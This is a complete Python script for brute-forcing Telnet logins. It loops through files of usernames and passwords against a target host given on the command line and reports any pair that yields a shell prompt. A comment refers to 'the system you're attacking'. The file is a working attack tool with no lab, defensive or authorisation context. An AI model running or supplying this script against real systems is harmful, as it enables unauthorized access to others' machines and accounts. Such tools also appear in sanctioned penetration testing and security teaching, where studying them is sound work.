import telnetlib
import argparse

def telnet_bruteforce(host, user_file, pass_file):
    try:
        # Open the username and password files
        with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
            usernames = uf.readlines()
            passwords = pf.readlines()

        for username in usernames:
            username = username.strip()
            for password in passwords:
                password = password.strip()
                print(f"[*] Trying {username}:{password} on {host}")
                try:
                    # Try to connect to the Telnet service
                    tn = telnetlib.Telnet(host)
                    tn.read_until(b"login: ")
                    tn.write(username.encode('ascii') + b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")

                    # Wait for a response (this may vary depending on the system you're attacking)
                    response = tn.read_until(b"$", timeout=5)
                    
                    if b"$" in response:
                        print(f"[+] Success! Username: {username} Password: {password}")
                        tn.close()
                        return
                    else:
                        print(f"[-] Failed: {username}:{password}")

                    tn.close()
                except Exception as e:
                    print(f"[!] Error: {e}")
    except FileNotFoundError as fnf_error:
        print(f"[!] File not found: {fnf_error}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Telnet Brute Force Script")
    parser.add_argument('-u', '--userfile', required=True, help="File containing usernames")
    parser.add_argument('-p', '--passfile', required=True, help="File containing passwords")
    parser.add_argument('-H', '--host', required=True, help="Target IP Address")  # Changed -h to -H

    args = parser.parse_args()
    telnet_bruteforce(args.host, args.userfile, args.passfile)
